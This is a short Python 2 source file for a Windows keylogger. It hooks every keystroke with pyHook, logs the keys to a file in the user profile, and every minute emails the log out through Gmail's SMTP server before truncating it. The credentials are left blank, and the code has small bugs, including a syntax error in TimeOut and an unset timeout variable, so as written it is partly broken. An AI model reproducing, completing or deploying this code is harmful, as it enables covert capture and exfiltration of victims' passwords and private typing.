#coding:utf-8

import os
import subprocess
from datetime import datetime
import time
import pyHook, pythoncom, sys, logging

email = ''
passwd = ''

sec = 60
file_log = 'C:\\Users\\%UserName%\\key.dat'

def TimeOut():
    if time.time() > timeout:
        return True:
    else:
        return False

def SendEmail(user, pwd, recipient, subject, body):
    import smtplib

    smtp_user = user
    smtp_passwd = pwd
    FROM = user
    TO = recipient if type(recipient) is list else [recipient]
    SUBJECT = subject
    TEXT = body

    message = """\From: %s\nTo: %s\nSubject: %s\n\n%s
    """ % (FROM, ", ".join(TO), SUBJECT, TEXT)
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.ehlo()
        server.starttls()
        server.login(smtp_user, smtp_passwd)
        server.sendmail(FROM, TO, message)
    
    except:
        print 'Error'


def FormatAndSendEmail():
    with open(file_log,'r+') as f:
        actualdate = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        content = f.read().replace('\n','');
        content = 'Log Retrieve : '+actualdate+'\n' +content
        SendEmail(email, passwd, email, 'New Log - '+actualdate, content)
        f.seek(0)
        f.truncate()

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format = '%(message)s')
    logging.log(10, chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    if TimeOut():
        FormatAndSendEmail()
        timeout = time.time() + sec
    
    pythoncom.PumpWaitingMessages()
